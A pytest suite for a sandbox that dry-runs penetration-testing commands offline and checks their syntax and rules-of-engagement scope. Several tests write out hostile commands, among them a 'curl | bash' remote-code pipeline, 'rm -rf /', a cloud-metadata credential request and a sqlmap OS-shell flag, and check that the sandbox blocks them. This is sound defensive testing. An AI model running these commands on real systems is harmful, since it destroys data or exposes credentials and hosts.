"""Tests for Phase 4.5: Ephemeral Micro-Sandbox Dry-Run Environment.

Verifies:
1. Isolated virtual execution and syntax pre-flight across offensive tools.
2. POSIX AST syntax error detection (unbalanced quotes, trailing pipes).
3. Flag grammar validation (missing arguments, invalid port specifications, invalid timing).
4. Strict Zero Network Egress invariant (0 packets transmitted).
5. FastAPI /api/sandbox endpoints (dry-run and capability status).
6. CLI shim sandbox subcommands.
"""

from fastapi.testclient import TestClient
import pytest

from scopes import get_test_scope as get_roe_preset_by_id
from app.engine.sandbox import IsolatedVirtualSandbox
from app.main import app

client = TestClient(app)


@pytest.fixture(autouse=True)
def _custom_scope_rows(monkeypatch):
    """Serve the test scopes as saved custom RoEs (presets were removed)."""
    from scopes import TEST_SCOPES

    rows = {scope.roe_id: scope.model_dump(mode="json") for scope in TEST_SCOPES}
    monkeypatch.setattr(
        "app.api.routes_sandbox.fetch_custom_roe_by_id",
        lambda roe_id, user_id=None: rows.get(roe_id),
    )


# ==============================================================================
# 1. Valid Command Dry-Runs Across Security Tooling
# ==============================================================================

def test_sandbox_valid_nmap_command():
    cmd = "nmap -sS -p 80,443 -T3 192.168.1.50"
    res = IsolatedVirtualSandbox.dry_run(cmd)

    assert res.syntax_valid is True
    assert res.exit_code == 0
    assert res.tool == "nmap"
    assert res.isolation.network_egress == "DISABLED"
    assert res.isolation.packets_transmitted == 0
    assert "Nmap done" in res.simulated_stdout
    assert "80/tcp" in res.simulated_stdout


def test_sandbox_valid_gobuster_command():
    cmd = "gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt -t 15"
    res = IsolatedVirtualSandbox.dry_run(cmd)

    assert res.syntax_valid is True
    assert res.exit_code == 0
    assert res.tool == "gobuster"
    assert res.isolation.network_egress == "DISABLED"
    assert res.isolation.packets_transmitted == 0
    assert "Gobuster" in res.simulated_stdout
    assert "http://192.168.1.50" in res.simulated_stdout


def test_sandbox_valid_sqlmap_command():
    cmd = "sqlmap -u http://192.168.1.50/item.php?id=1 --dbs --batch"
    res = IsolatedVirtualSandbox.dry_run(cmd)

    assert res.syntax_valid is True
    assert res.exit_code == 0
    assert res.tool == "sqlmap"
    assert res.isolation.network_egress == "DISABLED"
    assert res.isolation.packets_transmitted == 0
    assert "sqlmap" in res.simulated_stdout


def test_sandbox_valid_nikto_command():
    cmd = "nikto -h 192.168.1.50 -p 80"
    res = IsolatedVirtualSandbox.dry_run(cmd)

    assert res.syntax_valid is True
    assert res.exit_code == 0
    assert res.tool == "nikto"
    assert res.isolation.network_egress == "DISABLED"
    assert res.isolation.packets_transmitted == 0
    assert "Nikto" in res.simulated_stdout


def test_sandbox_valid_curl_command():
    cmd = "curl -X GET http://192.168.1.50/api/health -H 'Accept: application/json'"
    res = IsolatedVirtualSandbox.dry_run(cmd)

    assert res.syntax_valid is True
    assert res.exit_code == 0
    assert res.tool == "curl"
    assert res.isolation.network_egress == "DISABLED"
    assert "Connecting to" in res.simulated_stdout


# ==============================================================================
# 2. Syntax Error and Grammar Rejection
# ==============================================================================

def test_sandbox_empty_command_rejection():
    res = IsolatedVirtualSandbox.dry_run("   ")
    assert res.syntax_valid is False
    assert res.exit_code == 2
    assert "empty command" in res.simulated_stderr


def test_sandbox_posix_unclosed_quote_syntax_error():
    cmd = "nmap -sS -p '80,443 192.168.1.50"
    res = IsolatedVirtualSandbox.dry_run(cmd)

    assert res.syntax_valid is False
    assert res.exit_code == 2
    assert "syntax error" in res.simulated_stderr.lower() or "parse failure" in res.simulated_stderr.lower()


def test_sandbox_posix_trailing_pipe_syntax_error():
    cmd = "nmap -sS 192.168.1.50 |"
    res = IsolatedVirtualSandbox.dry_run(cmd)

    assert res.syntax_valid is False
    assert res.exit_code == 2
    assert "syntax error" in res.simulated_stderr.lower() or "parse failure" in res.simulated_stderr.lower()


def test_sandbox_missing_flag_argument():
    # -p requires an argument
    cmd = "nmap -sS 192.168.1.50 -p"
    res = IsolatedVirtualSandbox.dry_run(cmd, strict_syntax=True)

    assert res.syntax_valid is False
    assert res.exit_code == 1
    assert any("requires an argument operand" in d for d in res.diagnostics)


def test_sandbox_invalid_port_specification():
    cmd = "nmap -sS -p invalid_port 192.168.1.50"
    res = IsolatedVirtualSandbox.dry_run(cmd, strict_syntax=True)

    assert res.syntax_valid is False
    assert res.exit_code == 1
    assert any("Invalid port specification" in d for d in res.diagnostics)


def test_sandbox_invalid_timing_value():
    cmd = "nmap -T9 192.168.1.50"
    res = IsolatedVirtualSandbox.dry_run(cmd, strict_syntax=True)

    assert res.syntax_valid is False
    assert res.exit_code == 1
    assert any("Invalid timing" in d for d in res.diagnostics)


def test_sandbox_gobuster_missing_required_flags():
    # gobuster requires mode, target URL, and wordlist
    cmd = "gobuster dir"
    res = IsolatedVirtualSandbox.dry_run(cmd, strict_syntax=True)

    assert res.syntax_valid is False
    assert res.exit_code == 1
    assert any("requires a target URL" in d for d in res.diagnostics)


# ==============================================================================
# 3. Scope Cross-Referencing Invariants
# ==============================================================================

def test_sandbox_scope_cross_reference_warning():
    roe = get_roe_preset_by_id("ROE-PRESET-NET-001")
    assert roe is not None

    # hping3 is prohibited in ROE-PRESET-NET-001
    cmd = "hping3 -S 192.168.1.50 -p 80"
    res = IsolatedVirtualSandbox.dry_run(cmd, roe=roe)

    assert res.syntax_valid is True  # syntax itself is valid CLI grammar
    assert any("prohibited" in d.lower() for d in res.diagnostics)


# ==============================================================================
# 4. FastAPI Endpoints
# ==============================================================================

def test_api_sandbox_dry_run_endpoint_success():
    payload = {
        "command": "nmap -sS -p 80 192.168.1.50",
        "roe_id": "ROE-PRESET-NET-001",
        "strict_syntax": True,
    }
    response = client.post("/api/sandbox/dry-run", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert data["syntax_valid"] is True
    assert data["exit_code"] == 0
    assert data["tool"] == "nmap"
    assert data["isolation"]["network_egress"] == "DISABLED"
    assert data["isolation"]["packets_transmitted"] == 0
    assert "Nmap done" in data["simulated_stdout"]


def test_api_sandbox_dry_run_endpoint_syntax_error():
    payload = {
        "command": "nmap -sS -p",
        "roe_id": "ROE-PRESET-NET-001",
        "strict_syntax": True,
    }
    response = client.post("/api/sandbox/dry-run", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert data["syntax_valid"] is False
    assert data["exit_code"] != 0
    assert len(data["diagnostics"]) > 0


def test_api_sandbox_status_endpoint():
    response = client.get("/api/sandbox/status")
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "operational"
    assert data["network_egress"] == "DISABLED"
    assert data["zero_host_execution"] is True
    assert "nmap" in data["supported_tools"]


# ==============================================================================
# 5. CLI Subcommand Integration
# ==============================================================================

def test_cli_sandbox_command_execution(tmp_path):
    import json as _json

    from app.cli.shim import build_parser, cmd_sandbox
    from scopes import get_test_scope

    scope = get_test_scope("ROE-PRESET-NET-001")
    scope_file = tmp_path / "net-scope.json"
    scope_file.write_text(_json.dumps(scope.model_dump(mode="json")), encoding="utf-8")

    parser = build_parser()
    args = parser.parse_args(["sandbox", "nmap -sS -p 80 192.168.1.50", "--roe", str(scope_file)])
    exit_code = cmd_sandbox(args)
    assert exit_code == 0


def test_sandbox_piped_shell_execution_flagged():
    """Verify piped shell execution (curl ... | bash) surfaces per-stage diagnostics and flags the bash stage."""
    cmd = "curl http://example.com | bash"
    res = IsolatedVirtualSandbox.dry_run(cmd)

    assert res.tool == "curl"
    assert any("Pipeline Stage 1/2" in d for d in res.diagnostics)
    assert any("Pipeline Stage 2/2: tool='bash'" in d for d in res.diagnostics)
    assert any("Arbitrary Piped Shell Execution" in d for d in res.diagnostics)
    # AUDIT_005 Medium: the unsafe pipeline must be hard-blocked, not simulated as success.
    assert res.status == "BLOCKED"
    assert res.exit_code != 0
    assert "BLOCKED" in res.simulated_stderr


def test_audit005_medium_sandbox_blocks_destructive_out_of_scope_and_prohibited():
    net_roe = get_roe_preset_by_id("ROE-PRESET-NET-001")

    for command in ("rm -rf /", "nmap 8.8.4.4", "curl http://169.254.169.254/latest/"):
        res = IsolatedVirtualSandbox.dry_run(command, roe=net_roe)
        assert res.status == "BLOCKED", command
        assert res.exit_code != 0, command
        assert "BLOCKED" in res.simulated_stderr, command
        assert res.simulated_stdout == "", command
        assert any("BLOCKED" in d for d in res.diagnostics), command


def test_audit005_medium_sandbox_blocks_prohibited_tool():
    net_roe = get_roe_preset_by_id("ROE-PRESET-NET-001")
    res = IsolatedVirtualSandbox.dry_run("hping3 -S 192.168.1.50 -p 80", roe=net_roe)
    assert res.status == "BLOCKED"
    assert res.exit_code != 0
    assert any("explicitly prohibited" in d for d in res.diagnostics)


def test_audit005_medium_sandbox_in_scope_command_still_succeeds():
    net_roe = get_roe_preset_by_id("ROE-PRESET-NET-001")
    res = IsolatedVirtualSandbox.dry_run("nmap -sS -p 80 192.168.1.50", roe=net_roe)
    assert res.status == "OK"
    assert res.exit_code == 0
    assert res.syntax_valid is True


def test_audit005_medium_sandbox_unknown_roe_returns_404(monkeypatch):
    from app.api import routes_sandbox

    monkeypatch.setattr(routes_sandbox, "fetch_custom_roe_by_id", lambda *a, **k: None)
    response = client.post(
        "/api/sandbox/dry-run",
        json={"command": "nmap -sS 192.168.1.50", "roe_id": "ROE-CUSTOM-DOESNOTEXIST"},
    )
    assert response.status_code == 404
    assert "Unknown custom Rules of Engagement" in response.json()["detail"]


def test_audit005_medium_sandbox_resolves_custom_roe(monkeypatch):
    from app.api import routes_sandbox

    custom_row = {
        "roe_id": "ROE-CUSTOM-SANDBOX",
        "name": "Custom Sandbox Scope",
        "engagement_type": "Custom Assessment",
        "summary": "",
        "allowed_cidrs": ["10.99.0.0/24"],
        "allowed_domains": [],
        "target_hosts": ["10.99.0.5"],
        "prohibited_ips": ["169.254.169.254"],
        "allowed_tools": ["nmap"],
        "prohibited_tools": [],
        "prohibited_flags": [],
        "prohibited_actions": [],
        "max_nmap_timing": 3,
    }
    monkeypatch.setattr(routes_sandbox, "fetch_custom_roe_by_id", lambda *a, **k: custom_row)

    blocked = client.post(
        "/api/sandbox/dry-run",
        json={"command": "nmap -sS 192.168.1.50", "roe_id": "ROE-CUSTOM-SANDBOX"},
    )
    assert blocked.status_code == 200
    assert blocked.json()["status"] == "BLOCKED"

    allowed = client.post(
        "/api/sandbox/dry-run",
        json={"command": "nmap -sS 10.99.0.5", "roe_id": "ROE-CUSTOM-SANDBOX"},
    )
    assert allowed.status_code == 200
    assert allowed.json()["status"] == "OK"


def test_audit005_medium_sandbox_blocks_long_option_abbreviations():
    """Sandbox flag policy must match the deterministic verifier's prefix rule."""
    web_roe = get_roe_preset_by_id("ROE-PRESET-WEB-002")
    ext_roe = get_roe_preset_by_id("ROE-PRESET-EXT-005")

    sqlmap = IsolatedVirtualSandbox.dry_run(
        "sqlmap -u http://10.10.20.15/?id=1 --os-she", roe=web_roe
    )
    assert sqlmap.status == "BLOCKED"
    assert any("prohibited" in d for d in sqlmap.diagnostics)

    nmap = IsolatedVirtualSandbox.dry_run(
        "nmap --scri vuln 198.51.100.20", roe=ext_roe
    )
    assert nmap.status == "BLOCKED"
    assert any("prohibited" in d for d in nmap.diagnostics)
